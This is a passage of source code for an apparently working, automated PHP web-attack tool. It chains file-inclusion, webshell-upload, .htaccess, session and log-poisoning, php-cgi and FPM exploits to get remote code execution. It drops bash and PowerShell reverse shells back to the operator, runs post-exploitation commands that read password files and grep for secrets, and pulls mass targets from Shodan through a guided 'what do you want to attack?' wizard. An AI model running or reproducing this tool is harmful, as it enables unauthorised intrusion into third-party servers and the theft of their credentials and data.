            continue
        if LFI_MARKER in r.text:
            t.note(Finding(K.EXEC, "lfi:chain", proof_body(r.text, LFI_MARKER, LFI_END) or "marker",
                           hard=True))
            ok(f"{t.host_header()} runs code via filter chain")
            return

    try:
        r = t.get2(f"{page}?{param}={q('expect://' + cmd)}", read_cap=60_000)
        if cmd.split()[0] in r.text and "expect://" not in r.text:
            t.note(Finding(K.EXEC, "lfi:expect", r.text.strip()[:300], hard=True))
            ok(f"{t.host_header()} runs code via expect://")
    except OSError:
        pass


def _upload_names(stem: str = "phpomni") -> list[tuple[str, bytes]]:
    out = []
    for e in EXT_ORDER:
        body = PHP_EXEC.encode()
        if e in (".phps", ".shtml"):
            body = MIME_POLYGLOT + body
        for suf in NAME_SUFFIX:
            out.append((f"{stem}{e}{suf}", body))
    return out


RE_RETURNED = re.compile(r'"(?:url|file|path|location|filename|link|src)"\s*:\s*"([^"]{1,200})"', re.I)


def _returned_paths(text: str, fname: str) -> list[str]:
    cand = [m.group(1) for m in RE_RETURNED.finditer(text)]
    cand += [m.group(1) for m in re.finditer(r'href=["\']([^"\']*' + re.escape(fname) + r'[^"\']*)',
                                             text, re.I)]
    out: list[str] = []
    for u in cand:
        if fname not in u:
            continue
        u = u if u.startswith("/") else "/" + u.lstrip("./")
        if u not in out:
            out.append(u)
    return out[:6]


def _try_handler(t: Target, h: dict, fname: str, data: bytes) -> str:
    bnd = ("----phpomni" + uuid4().hex).encode()
    fields = list((h.get("extra") or {}).items())
    fields.append((h["field"], fname, data, "image/gif"))
    try:
        t.post(h["path"], read_cap=80_000)
        r = t.post(build_multipart(fields, bnd), f"multipart/form-data; boundary={bnd.decode()}",
                   path=h["path"], read_cap=80_000)
    except OSError:
        return ""
    if SHELL_MARKER in r.text:
        t.note(Finding(K.LEAK, "upload", f"reflected by {h['path']}"))
        return h["path"]
    hdir = h["path"].rsplit("/", 1)[0] + "/"
    for c in dict.fromkeys(_returned_paths(r.text, fname) + [hdir + fname]
                           + [d + fname for d in SHELL_DIRS]):
        try:
            if SHELL_MARKER in t.get(c, read_cap=40_000).text:
                return c
        except OSError:
            continue
    return ""


def upload_prong(t: Target, cmd: str, words: list[str]) -> None:
    handlers = discover_upload_handlers(t, words)
    if not handlers:
        t.note(Finding(K.FAIL, "upload", "no handler discovered"))
        return
    t.handler = handlers[0]
    for h in handlers[:6]:
        t.handler = h
        for fname, data in _upload_names():
            path = _try_handler(t, h, fname, data)
            if not path:
                continue
            t.writable = h["path"].rsplit("/", 1)[0] + "/"
            t.note(Finding(K.LEAK, "upload", f"{h['path']} accepted {fname}"))
            if path == h["path"]:
                t.note(Finding(K.EXEC, "upload", f"executes on POST via {h['path']}", hard=True))
                ok(f"{t.host_header()} runs code on POST: {h['path']}")
                return
            try:
                r = t.get(f"{path}?c={q(base64.b64encode(cmd.encode()).decode())}", read_cap=120_000)
            except OSError:
                continue
            if SHELL_MARKER in r.text:
                t.shell_url = t.url(path)
                t.ext_ok = fname.rsplit(".", 1)[-1]
                t.note(Finding(K.SHELL, "upload", t.shell_url, hard=True))
                out = proof_body(r.text, "=B=", "=E=")
                if out:
                    t.note(Finding(K.EXEC, "shell", out[:300], hard=True))
                ok(f"{t.host_header()} SHELL {t.shell_url}")
                return


def config_upload_prong(t: Target, cmd: str) -> None:
    if not t.writable:
        return
    d, bnd = t.writable, ("----phpomni" + uuid4().hex).encode()
    field = (t.handler or {}).get("field", "file")
    extra = list(((t.handler or {}).get("extra") or {}).items())
    ctype = f"multipart/form-data; boundary={bnd.decode()}"

    def put(name: str, data: bytes) -> bool:
        try:
            t.post(d, build_multipart(extra + [(field, name, data, "text/plain")], bnd),
                   ctype, read_cap=20_000)
            return True
        except OSError:
            return False

    for rules in HTACCESS_VARIANTS:
        if not put(".htaccess", rules) or not put("phpomni.phpomni", PHP_EXEC.encode()):
            continue
        try:
            if SHELL_MARKER in t.get(d + "phpomni.phpomni", read_cap=40_000).text:
                t.shell_url = t.url(d + "phpomni.phpomni")
                t.note(Finding(K.SHELL, "htaccess", t.shell_url, hard=True))
                ok(f"{t.host_header()} .htaccess bypass -> {t.shell_url}")
                return
        except OSError:
            continue
    for rules in USERINI_VARIANTS:
        if not put(".user.ini", rules) or not put("phpomni.php", PHP_EXEC.encode()):
            continue
        for _ in range(6):
            time.sleep(1.0)
            try:
                if SHELL_MARKER in t.get(d + "phpomni.php", read_cap=40_000).text:
                    t.shell_url = t.url(d + "phpomni.php")
                    t.note(Finding(K.SHELL, "userini", t.shell_url, hard=True))
                    ok(f"{t.host_header()} .user.ini bypass -> {t.shell_url}")
                    return
            except OSError:
                continue


def _progress_variants(name: str) -> tuple[str, ...]:
    inner = f'a:2:{{s:4:"name";s:{len(name)}:"{name}";s:8:"handler";s:3:"php";}}'
    return (f"upload_progress|{inner}", inner)


def session_prong(t: Target, cmd: str) -> None:
    if not t.route or not t.profile.session_progress:
        return
    page, param = t.route
    body = f"<?php echo '{LFI_MARKER}';system('{cmd}');echo '{LFI_END}';?>"
    bnd = ("----phpomni" + uuid4().hex).encode()
    stop = threading.Event()

    def keep(name: str) -> None:
        mp = build_multipart([("PHP_SESSION_UPLOAD_PROGRESS", name),
                              ("f", "x.txt", os.urandom(1 << 16), "text/plain")], bnd)
        ct = f"multipart/form-data; boundary={bnd.decode()}"
        while not stop.is_set():
            try:
                t.post(mp, ct, read_cap=4096)
            except OSError:
                pass
            time.sleep(0.15)

    for name in _progress_variants(body):
        stop.clear()
        threading.Thread(target=keep, args=(name,), daemon=True).start()
        time.sleep(0.6)
        for sp in session_paths(t):
            for _ in range(4):
                try:
                    r = t.get2(f"{page}?{param}={q(sp + 'sess_' + t.sid)}", read_cap=120_000)
                except OSError:
                    break
                if LFI_MARKER in r.text:
                    stop.set()
                    t.note(Finding(K.EXEC, "session", proof_body(r.text, LFI_MARKER, LFI_END) or sp,
                                   hard=True))
                    ok(f"{t.host_header()} session poison via {sp}")
                    return
                time.sleep(0.25)
        stop.set()
        time.sleep(0.2)


def logpoison_prong(t: Target, cmd: str) -> None:
    if not t.route:
        return
    page, param = t.route
    payload = f"<?php echo '{LFI_MARKER}';system('{cmd}');echo '{LFI_END}';?>"
    for log in [c for c in SCAN_SENSITIVE if "log" in c or "environ" in c]:
        try:
            t.raw_request("GET", "/phpomni-" + uuid4().hex, extra={"User-Agent": payload})
        except OSError:
            continue
        for depth in (1, 3, 5):
            try:
                r = t.get2(f"{page}?{param}={q('../' * depth + log.lstrip('/'))}", read_cap=200_000)
            except OSError:
                continue
            if LFI_MARKER in r.text:
                t.note(Finding(K.EXEC, "poison", f"{log}: "
                               f"{proof_body(r.text, LFI_MARKER, LFI_END)[:200]}", hard=True))
                ok(f"{t.host_header()} log poison via {log}")
                return


def php2shell_prong(t: Target, cmd: str) -> None:
    payload = f"<?php echo '{LFI_MARKER}';system('{cmd}');echo '{LFI_END}';?>".encode()
    base = t.base.rsplit("/", 1)[0] + "/"
    for qs in ("?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp%3a%2f%2finput",
               "?-d+auto_prepend_file%3dphp%3a%2f%2finput"):
        for path in (base + "index.php", t.base):
            try:
                r = t.raw_request("POST", path + qs, payload,
                                  {"Content-Type": "application/x-www-form-urlencoded"}, 80_000)
            except OSError:
                continue
            if LFI_MARKER in r.text:
                t.note(Finding(K.EXEC, "php2shell", proof_body(r.text, LFI_MARKER, LFI_END) or path,
                               hard=True))
                ok(f"{t.host_header()} php-cgi -d RCE")
                return


def cgi_prong(t: Target, cmd: str) -> None:
    payload = f"<?php echo '{LFI_MARKER}';system('{cmd}');echo '{LFI_END}';?>".encode()
    for path in (t.base, t.base.rstrip("/") + "/index.php"):
        for qs in ("?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp%3a%2f%2finput", "?-s"):
            try:
                r = t.raw_request("POST", path + qs, payload,
                                  {"Content-Type": "application/x-www-form-urlencoded"}, 80_000)
            except OSError:
                continue
            if LFI_MARKER in r.text:
                t.note(Finding(K.EXEC, "cgi", proof_body(r.text, LFI_MARKER, LFI_END) or path,
                               hard=True))
                ok(f"{t.host_header()} CVE-2012-1823")
                return
            if "php.ini" in r.text and not t.profile.php:
                t.profile.sapi = "cgi"
                parse_ini(t, r.text)


def fpm_prong(t: Target, cmd: str) -> None:
    if not t.writable and not t.handler:
        return
    d = t.writable or "/"
    bnd = ("----phpomni" + uuid4().hex).encode()
    field = (t.handler or {}).get("field", "file")
    socks = ["127.0.0.1:9000"]
    if t.profile.php:
        socks.append(f"/var/run/php/php{t.profile.php}-fpm.sock")
    socks += ["/var/run/php-fpm.sock", "/run/php/php-fpm.sock"]
    for name, code in (("phpomni_fpm.php", PHP_FPM.encode()), ("phpomni_glob.php", PHP_GLOB.encode())):
        try:
            t.post(d, build_multipart([(field, name, code, "text/plain")], bnd),
                   f"multipart/form-data; boundary={bnd.decode()}", read_cap=20_000)
        except OSError:
            continue
        for s in dict.fromkeys(socks):
            try:
                r = t.get(f"{d}{name}?s={q(s, '/:.')}&f={q(d + name, '/:.')}&c={q(cmd)}",
                          read_cap=200_000)
            except OSError:
                continue
            if re.search(r"uid=\d+|root:x:0", r.text):
                t.note(Finding(K.EXEC, "fpm", f"{s}: {r.text.strip()[:200]}", hard=True))
                ok(f"{t.host_header()} FPM socket RCE ({s})")
                return


def command_prong(t: Target, cmd: str) -> None:
    mark = uuid4().hex[:8]
    probe = f"echo {mark};{cmd}"
    for p in (t.base, t.base.rstrip("/") + "/index.php"):
        for k in ("cmd", "exec", "command", "c", "run", "shell", "1"):
            try:
                r = t.get2(f"{p}?{k}={q(probe)}", read_cap=80_000)
                if mark in r.text:
                    t.note(Finding(K.EXEC, "cmd", f"{p}?{k}: "
                                   f"{r.text.split(mark, 1)[1].strip()[:300]}", hard=True))
                    return
                r = t.post(f"{k}={q(probe)}".encode(), path=p, read_cap=80_000)
                if mark in r.text:
                    t.note(Finding(K.EXEC, "cmd", f"POST {p} {k}: "
                                   f"{r.text.split(mark, 1)[1].strip()[:300]}", hard=True))
                    return
            except OSError:
                continue


class HttpShell:
    """Commands over the webshell URL. Survives NAT, VPN tunnels and firewalls."""

    def __init__(self, t: Target, url: str):
        self.t, self.url = t, url
        self.shells = [url]
        self.ok = True

    def send(self, line: str) -> None:
        sep = "&" if "?" in self.url else "?"
        cq = q(base64.b64encode(line.encode()).decode())
        try:
            r = self.t.get(f"{self.url}{sep}c={cq}", read_cap=400_000)
        except OSError as exc:
            bad(f"http shell: {exc}")
            return
        out = proof_body(r.text, "=B=", "=E=")
        print(out if out else r.text.strip()[:4000], flush=True)

    def stop(self) -> None:
        pass


class ShellListener:
    def __init__(self, port: int):
        self.srv: socket.socket | None = None
        self.port = 0
        for p in ([0] if port == 0 else list(range(port, port + 8))):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(("0.0.0.0", p))
                s.listen(8)
                s.settimeout(0.25)
                self.srv, self.port = s, s.getsockname()[1]
                break
            except OSError:
                continue
        self.shells: list[socket.socket] = []
        self._stop = threading.Event()
        if self.srv:
            threading.Thread(target=self._accept, daemon=True).start()

    @property
    def ok(self) -> bool:
        return self.srv is not None

    def _accept(self) -> None:
        while not self._stop.is_set() and self.srv:
            try:
                c, a = self.srv.accept()
            except (socket.timeout, OSError):
                continue
            c.settimeout(0.05)
            self.shells.append(c)
            ok(f"shell from {a[0]} ({len(self.shells)} active)")
            threading.Thread(target=self._pump, args=(c, a[0]), daemon=True).start()

    def _pump(self, c: socket.socket, ip: str) -> None:
        while not self._stop.is_set():
            try:
                data = c.recv(4096)
            except socket.timeout:
                continue
            except OSError:
                break
            if not data:
                break
            sys.stdout.write("\n" + data.decode("latin1", "replace"))
            sys.stdout.flush()
        warn(f"shell {ip} closed")

    def send(self, line: str) -> None:
        if not self.shells:
            warn("no shells")
            return
        for c in list(self.shells):
            try:
                c.sendall((line + "\n").encode())
            except OSError:
                self.shells.remove(c)

    def stop(self) -> None:
        self._stop.set()
        for c in self.shells:
            try:
                c.close()
            except OSError:
                pass
        if self.srv:
            self.srv.close()


def shell_payload(t: Target) -> bytes:
    if not (t.lhost and t.lport):
        return PHP_EXEC.encode()
    if t.profile.os == "windows":
        ps = (f"$c=New-Object Net.Sockets.TCPClient('{t.lhost}',{t.lport});$s=$c.GetStream();"
              "[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
              "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
              "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
              "$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()")
        enc = base64.b64encode(ps.encode("utf-16-le")).decode()
        return f"<?php shell_exec('powershell -ep bypass -enc {enc}');?>".encode()
    rev = f"sh -c 'sh -i >& /dev/tcp/{t.lhost}/{t.lport} 0>&1'"
    return f"<?php $r='{rev}';if(!@shell_exec($r)){{@exec($r);}}?>".encode()


def drop_shell(t: Target) -> None:
    if not t.shell_url:
        return
    bnd = ("----phpomni" + uuid4().hex).encode()
    d = t.writable or "/"
    try:
        t.post(d, build_multipart([((t.handler or {}).get("field", "file"),
                                    "phpomni_rev.php", shell_payload(t), "text/plain")], bnd),
               f"multipart/form-data; boundary={bnd.decode()}", read_cap=20_000)
        t.get(d + "phpomni_rev.php", read_cap=20_000)
    except OSError:
        pass


STATE: dict[str, dict] = {}
STATE_LOCK = threading.Lock()
START = time.time()


def set_state(host: str, **kw) -> None:
    with STATE_LOCK:
        STATE.setdefault(host, {}).update(kw)


def dash_render() -> "Table":
    tbl = Table(expand=True, pad_edge=False)
    tbl.add_column("site", overflow="fold")
    tbl.add_column("doing", overflow="fold", width=12)
    tbl.add_column("result", overflow="fold")
    with STATE_LOCK:
        for host, s in list(STATE.items())[:40]:
            tbl.add_row(host, s.get("prong", "-"), (s.get("note") or s.get("state", ""))[:64])
    return tbl


def plan_for(t: Target, args) -> list[str]:
    steps: list[str] = []
    if t.profile.file_uploads and not args.no_upload:
        steps.append("upload")
    if not args.no_lfi:
        steps += ["lfi", "session", "logpoison"]
    if t.profile.allow_url_include:
        steps.append("php2shell")
    steps += ["fpm", "cgi", "command"]
    if args.config_upload:
        steps.append("config")
    return list(dict.fromkeys(steps))


def run_target(t: Target, args, words: list[str], listener: ShellListener | None) -> Target:
    host = t.host_header()
    set_state(host, state="looking")
    try:
        r = t.get(t.base, read_cap=400_000)
        detect_sapi(t, r.headers)
        detect_os(t, r.text)
    except OSError as exc:
        t.note(Finding(K.FAIL, "recon", str(exc)))
        set_state(host, state="dead", note=f"unreachable: {exc}")
        bad(f"{host} unreachable: {exc}")
        return t

    set_state(host, state="leaks")
    harvest_leaks(t)

    for step in plan_for(t, args):
        if t.hard and args.rce_only:
            break
        set_state(host, prong=step, state="trying")
        try:
            match step:
                case "upload":
                    upload_prong(t, args.cmd, [] if args.no_discover else words)
                case "lfi":
                    if not t.hard:
                        lfi_prong(t, args.cmd)
                case "session":
                    session_prong(t, args.cmd)
                case "logpoison":
                    logpoison_prong(t, args.cmd)
                case "php2shell":
                    php2shell_prong(t, args.cmd)
                case "fpm":
                    fpm_prong(t, args.cmd)
                case "cgi":
                    cgi_prong(t, args.cmd)
                case "command":
                    command_prong(t, args.cmd)
                case "config":
                    config_upload_prong(t, args.cmd)
        except Exception as exc:
            if args.debug:
                traceback.print_exc()
            t.note(Finding(K.FAIL, step, repr(exc)[:160]))
        hit = [f for f in t.findings if f.hard]
        set_state(host, note=hit[-1].detail if hit else "", state="hit" if hit else "-")

    if t.hard and listener and listener.ok and args.transport != "http":
        drop_shell(t)
    set_state(host, state="SHELL" if t.shell_url else ("code ran" if t.hard else "nothing"))
    return t


def meaning(t: Target) -> str:
    if t.shell_url:
        return "You have a webshell. You can run commands on this box."
    if t.hard:
        return "Code ran, but the shell file could not be reached."
    if t.route:
        return "The site reads files off disk but will not run code."
    return "Nothing worked. The upload form is probably behind a login."


def report(t: Target, as_json: bool) -> None:
    if as_json:
        print(json.dumps({"target": t.url("/"), "os": t.profile.os, "sapi": t.profile.sapi,
                          "php": t.profile.php, "shell": t.shell_url, "hard": t.hard,
                          "findings": [{"kind": str(f.kind), "prong": f.prong, "detail": f.detail}
                                       for f in t.findings]}), flush=True)
        return
    say("")
    say(_c("=" * 78, "90"))
    say(f"{t.url('/')}   os={t.profile.os}  sapi={t.profile.sapi}  php={t.profile.php or '?'}")
    say("  " + meaning(t))
    for f in t.findings:
        col = {"LEAK": "36", "EXEC": "33", "SHELL": "32", "FAIL": "90"}[str(f.kind)]
        say(f"  {_c('[' + str(f.kind) + ']', col):<18} {f.prong:12} {f.detail}")
    if t.shell_url:
        say(_c(f"  >> {t.shell_url}?c=<base64 cmd>", "32"))
    say(_c("=" * 78, "90"))


def load_words(path: str | None) -> list[str]:
    for cand in ([path] if path else []) + [os.path.join(os.path.dirname(
            os.path.abspath(__file__)), "wordlist.txt")]:
        if cand and os.path.isfile(cand):
            with open(cand, encoding="utf-8", errors="replace") as fh:
                return [w.strip() for w in fh if w.strip() and not w.startswith("#")]
    return FALLBACK_WORDS


def shodan_targets(query: str, key: str, limit: int) -> list[str]:
    out: list[str] = []
    for page in range(1, 6):
        try:
            c = http.client.HTTPSConnection("api.shodan.io", timeout=20)
            c.request("GET", f"/shodan/host/search?key={key}&query={q(query)}&minify=true&page={page}")
            r = c.getresponse()
            if r.status == 429:
                time.sleep(2)
                continue
            matches = (json.loads(r.read() or b"{}") or {}).get("matches") or []
        except (OSError, ValueError):
            break
        if not matches:
            break
        for m in matches:
            ip, port = m.get("ip_str"), m.get("port")
            if not ip or not port:
                continue
            scheme = "https" if m.get("ssl") is not None else "http"
            out.append(f"{scheme}://{ip}{'' if port in (80, 443) else ':' + str(port)}/")
            if len(out) >= limit:
                return out
    return out[:limit]


def detect_mullvad() -> str:
    if os.name == "nt":
        return ""
    try:
        r = subprocess.run(["mullvad", "status"], capture_output=True, text=True, timeout=3)
        if "Connected" in (r.stdout + r.stderr):
            return "mullvad cli"
    except (OSError, subprocess.SubprocessError):
        pass
    try:
        with open("/proc/net/route") as fh:
            for line in fh.read().splitlines()[1:]:
                f = line.split()
                if len(f) > 3 and f[1] == "00000000" and "mullvad" in f[0]:
                    return f"route {f[0]}"
    except OSError:
        pass
    return ""


def public_ip() -> str:
    for u in ("https://am.i.mullvad.net/ip", "https://api.ipify.org"):
        try:
            r = Target(u, timeout=6, delay=(0, 0)).get("/", read_cap=4096)
            ip = r.text.strip().splitlines()[0].strip()
            if re.fullmatch(r"[\d.]+", ip):
                return ip
        except (OSError, IndexError):
            continue
    return ""


def mullvad_by_ip() -> bool:
    ip = public_ip()
    if not ip:
        return False
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return any(addr in n for n in MULLVAD_NETS)


def auto_lhost() -> str:
    route = "127.0.0.1"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        route = s.getsockname()[0]
        s.close()
    except OSError:
        pass
    pub = public_ip()
    if pub:
        try:
            if not ipaddress.ip_address(pub).is_private:
                return pub
        except ValueError:
            pass
    return route


def mullvad_port() -> str:
    for cmd in (["mullvad", "port-forwarding", "get"], ["mullvad", "port", "get"]):
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
        except (OSError, subprocess.SubprocessError):
            continue
        m = re.search(r"\b(\d{4,5})\b", r.stdout)
        if m:
            return m.group(1)
    return ""


def build_target(url: str, args) -> Target:
    hdrs = {}
    for h in args.header or []:
        if ":" in h:
            k, _, v = h.partition(":")
            hdrs[k.strip()] = v.strip()
    lo, _, hi = (args.delay or "").partition("-")
    return Target(url, lhost=args.lhost, lport=args.lport, timeout=args.timeout,
                  delay=(float(lo or 0), float(hi or lo or 0)), retries=args.retries,
                  headers=hdrs, cookie=args.cookie or "",
                  auth=tuple(args.auth.split(":", 1)) if ":" in (args.auth or "") else None,
                  proxy=args.proxy or "", strict_ssl=args.strict_ssl)


QUICK = {
    ".id": "id; whoami; hostname; uname -a",
    ".sys": "uname -a; cat /etc/os-release 2>/dev/null; cat /etc/issue 2>/dev/null",
    ".net": "ip a 2>/dev/null || ifconfig -a; netstat -antp 2>/dev/null | head -40",
    ".users": "cat /etc/passwd",
    ".files": "ls -la; pwd; ls -la /var/www 2>/dev/null; ls -la /home 2>/dev/null",
    ".suid": "find / -perm -4000 -type f 2>/dev/null | head -40",
    ".env": "env; tr '\\0' '\\n' < /proc/self/environ",
    ".creds": ("grep -rEi 'pass|secret|token|api_key' /var/www 2>/dev/null "
               "| grep -v node_modules | head -40"),
    ".cron": "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.* 2>/dev/null",
    ".docker": "ls -la /.dockerenv /var/run/docker.sock 2>/dev/null; mount | grep -i docker",
    ".tty": ("python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || "
             "python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || "
             "script -qc /bin/bash /dev/null"),
}

ACTIONS = [
    ("who am i", ".id"), ("system info", ".sys"), ("list files", ".files"),
    ("read /etc/passwd", ".users"), ("network info", ".net"),
    ("find SUID binaries", ".suid"), ("look for credentials", ".creds"),
    ("cron + docker", ".cron"), ("upgrade to a real shell", ".tty"),
    ("type my own command", ".raw"), ("show saved loot", ".loot"),
    ("show shell urls", ".url"), ("quit", ".exit"),
]


def shell_menu(sender, results: list[Target]) -> None:
    while True:
        pick = menu("what next?", ACTIONS, 1)
        if pick == ".exit":
            break
        if pick == ".loot":
            if not LOOT:
                warn("no loot dir")
            else:
                found = [os.path.join(r, f) for r, _, fs in os.walk(LOOT) for f in fs]
                for p in found:
                    say(p)
                if not found:
                    warn("nothing saved")
            continue
        if pick == ".url":
            for t in results:
                if t.shell_url:
                    say(t.shell_url)
            continue
        if pick == ".raw":
            sender.send(ask("  command"))
            continue
        sender.send(QUICK[pick])
    sender.stop()


def url_ok(v: str) -> bool:
    raw = re.sub(r"^https?://", "", v.strip()).split("/")[0]
    if raw.startswith("["):
        host = raw[1:raw.find("]")] if "]" in raw else raw[1:]
        return bool(re.fullmatch(r"[0-9a-fA-F:.]+", host))
    host = raw.split(":")[0]
    if not host or len(host) > 253:
        return False
    if host == "localhost" or re.fullmatch(r"[\d.]+", host):
        return True
    return bool(re.fullmatch(r"[\w\-]+(\.[\w\-]+)+", host))


def norm_url(v: str) -> str:
    v = v.strip()
    return v if v.startswith(("http://", "https://")) else "http://" + v


def ask(prompt: str, default: str = "", valid=None) -> str:
    while True:
        try:
            v = input(f"{prompt}" + (f" [{default}]" if default else "") + ": ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            raise SystemExit(0)
        v = v or default
        if valid and v:
            try:
                if not valid(v):
                    bad("that doesn't look right, try again")
                    continue
            except OSError:
                bad("could not open that, try again")
                continue
        if v:
            return v
        warn("this one's needed")


def menu(title: str, items: list[tuple[str, object]], default: int = 1):
    default = max(1, min(default, len(items)))
    say("")
    say(_c(title, "36"))
    for i, (label, _) in enumerate(items, 1):
        say(f"  {'*' if i == default else ' '}{i}) {label}")
    while True:
        raw = ask("  pick", str(default))
        if raw.isdigit() and 1 <= int(raw) <= len(items):
            return items[int(raw) - 1][1]
        bad("just the number from the list")


def wizard(args) -> argparse.Namespace | None:
    say(_c(BANNER, "36"))
    say("  a few questions, then it runs. press enter for the default.\n")

    kind = menu("what do you want to attack?", [
        ("one website", "url"),
        ("a list of websites in a file", "file"),
        ("search shodan", "shodan")], 1)
    targets: list[str] = []
    if kind == "url":
        targets = [norm_url(ask("  site address", "", url_ok))]
    elif kind == "file":
        path = ask("  path to the file", "", os.path.isfile)
        with open(path, encoding="utf-8") as fh:
            targets = [norm_url(x) for x in fh if x.strip() and not x.startswith("#")]
        ok(f"{len(targets)} sites loaded")
    else:
        if not args.shodan_key:
            args.shodan_key = ask("  shodan api key", "", lambda v: len(v) > 10)
        qs = ask("  search query", 'http.title:"Index of /" port:8080')
        inf("searching shodan...")
        try:
            targets = shodan_targets(qs, args.shodan_key, int(ask("  how many", "25") or 25))
        except ValueError:
            targets = shodan_targets(qs, args.shodan_key, 25)
        if not targets:
            bad("no results")
            return None
    if not targets:
        bad("no targets")
        return None

    vpn = detect_mullvad() or ("mullvad exit" if mullvad_by_ip() else "")
    if vpn:
        warn(f"VPN detected ({vpn}). A plain reverse shell usually cannot get back in.")
    args.transport = menu("how should a shell come back?", [
        ("auto - try reverse, fall back to HTTP", "auto"),
        ("reverse shell only", "rev"),
        ("commands over HTTP only - works behind any VPN", "http")], 3 if vpn else 1)

    auth = menu("does the site need a login?", [
        ("no", "none"), ("yes, I have a session cookie", "cookie"),
        ("yes, username and password", "basic")], 1)
    if auth == "cookie":
        args.cookie = ask("  cookie string")
    elif auth == "basic":
        args.auth = f"{ask('  username')}:{ask('  password')}"

    loud = menu("how loud should it be?", [
        ("quiet - slow, gentle, for live sites", "quiet"),
        ("normal", "normal"),
        ("loud - fast, also tries .htaccess tricks", "loud")], 2)
    if loud == "quiet":
        args.delay, args.threads = "0.3-0.8", 4
    elif loud == "loud":
        args.delay, args.threads, args.retries = "0-0.05", 16, 2
        args.config_upload = True
    else:
        args.delay, args.threads = "0.05-0.25", 8

    if args.transport != "http" and not args.lhost:
        args.lhost = auto_lhost()
        fwd = mullvad_port() if vpn else ""
        if fwd:
            args.lport = int(fwd)
            ok(f"using mullvad forwarded port {fwd}")
        elif vpn:
            warn("no forwarded port - will fall back to HTTP if reverse fails")

    say("")
    say(_c("  ready", "36"))
    say(f"    targets   {len(targets)}  ({targets[0]})")
    say(f"    shell     {args.transport}")
    say(f"    loudness  {loud}")
    if args.lhost:
        say(f"    call back {args.lhost}:{args.lport}")
    if not menu("go?", [("yes, run it", True), ("quit", False)], 1):
        return None
    args.urls = targets
    return args


def self_test() -> int:
    fails = 0

    def chk(name: str, cond: bool) -> None:
        nonlocal fails
        if not cond:
            fails += 1
            print(f"FAIL {name}")

    st, h, b = split_headers(b"HTTP/1.1 200 OK\r\nContent-Length: 3\r\n\r\nabc")
    chk("crlf", st == 200 and h.get("content-length") == "3" and b == b"abc")
    st, h, b = split_headers(b"HTTP/1.1 302 Found\nLocation: /x\n\nyo")
    chk("lf", st == 302 and h.get("location") == "/x" and b == b"yo")
    chk("no status", split_headers(b"garbage")[0] == 0)

    forms = parse_upload_forms("http://h/", b"<form action='/up.php'><input type=hidden name=csrf "
                                             b"value=t><input type=file name=doc></form>")
    chk("form bare", len(forms) == 1 and forms[0]["field"] == "doc" and forms[0]["path"] == "/up.php")
    chk("form extra", bool(forms) and forms[0]["extra"].get("csrf") == "t")
    forms = parse_upload_forms("http://h/x/", b'<form action="a.php" method="post">'
                                              b'<input type="file" name="img"></form>')
    chk("form quoted", len(forms) == 1 and forms[0]["path"] == "/x/a.php")
    chk("no file field",
        parse_upload_forms("http://h/", b'<form><input type="hidden" name="a"></form>') == [])

    mp = build_multipart([("f", "a.php", b"x", "image/gif")], b"B")
    chk("multipart", b'filename="a.php"' in mp and mp.endswith(b"--B--\r\n"))
    mp = build_multipart([("a", "b")], b"B")
    chk("multipart text", b'name="a"' in mp and b"filename=" not in mp and b"\r\n\r\nb\r\n" in mp)
    mp = build_multipart([("a", b"bytes")], b"B")
    chk("multipart bytes", b"\r\n\r\nbytes\r\n" in mp)

    chk("chain", build_chain("<?php echo 1;?>").startswith("php://filter/"))
    chk("chain chars", set(base64.b64encode(b"<?php echo 1;?>").decode()) <= set(_PFX))
    chk("names", any(n.endswith(".pht") for n, _ in _upload_names()))
    chk("returned", _returned_paths('{"url":"/up/a.php"}', "a.php") == ["/up/a.php"])
    chk("returned rel", _returned_paths('href="./a.php"', "a.php") == ["/a.php"])
    chk("proof", proof_body(f"{LFI_MARKER}out{LFI_END}tail", LFI_MARKER, LFI_END) == "out")
    chk("proof missing", proof_body("nope", LFI_MARKER, LFI_END) == "")

    chk("url_ok", all(url_ok(x) for x in (
        "example.com/x", "https://1.2.3.4:8080/", "localhost:8080", "sub.domain.co.uk",
        "[::1]:8080")))
    chk("url bad", not any(url_ok(x) for x in ("nope", "", "http://", "a b", "-")))
    chk("norm", norm_url("example.com") == "http://example.com")
    chk("norm keeps", norm_url("https://a.b") == "https://a.b")
    chk("menu clamp", menu.__defaults__ == (1,))
    chk("progress", len(_progress_variants("PAY")) == 2)
    chk("session_paths", all(p.endswith("/") for p in session_paths(Target("http://h/"))))
    chk("plan has upload", "upload" in plan_for(Target("http://h/"), argparse.Namespace(
        no_upload=False, no_lfi=False, config_upload=False)))
    chk("plan no upload", "upload" not in plan_for(Target("http://h/"), argparse.Namespace(
        no_upload=True, no_lfi=False, config_upload=False)))
    print("self-test:", "ok" if not fails else f"{fails} failed")
    return 1 if fails else 0


def main() -> int:
    global COLOR, QUIET, LOOT
    ap = argparse.ArgumentParser(description="phpomni v11")
    ap.add_argument("urls", nargs="*")
    ap.add_argument("-f", "--file")
    ap.add_argument("--shodan")
    ap.add_argument("--shodan-key", default=os.environ.get("SHODAN_API_KEY", ""))
    ap.add_argument("--limit", type=int, default=50)
    ap.add_argument("--wizard", action="store_true", help="guided setup")
    ap.add_argument("--pwn", action="store_true", help="everything on, auto lhost/lport")
    ap.add_argument("--transport", default="auto", choices=["auto", "rev", "http"])
    ap.add_argument("--lhost", default="")
    ap.add_argument("--lport", type=int, default=4444)
    ap.add_argument("--no-listener", action="store_true")
    ap.add_argument("-w", "--wordlist")
    ap.add_argument("--no-discover", action="store_true")
    ap.add_argument("-H", "--header", action="append")
    ap.add_argument("--cookie", default="")
